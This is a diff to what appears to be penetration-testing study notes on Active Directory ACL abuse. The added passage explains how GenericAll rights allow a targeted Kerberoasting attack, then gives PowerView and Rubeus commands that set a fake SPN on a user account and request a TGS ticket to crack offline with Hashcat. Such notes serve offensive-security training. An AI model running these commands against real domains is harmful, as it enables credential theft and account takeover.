@@ -29,10 +29,20 @@ ResolveGUIDs
 
 # ACL Abuse
 
-</b> Active Directory right must be GenericALL permission </b>
+** Active Directory right must be GenericALL permission **
 
 GenericAll is Full control.
 
 GenericWrite is Can modify some attributes, but not complete control.
+
+Given that we have GenericAll permissions on this account, we can conduct a targeted Kerberoasting attack by modifying the account's servicePrincipalName (SPN) attribute to register a fake SPN. This will allow us to request a Ticket Granting Service (TGS) ticket, which we can then extract and attempt to crack offline using Hashcat.
+
+```
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+
+```
 
 
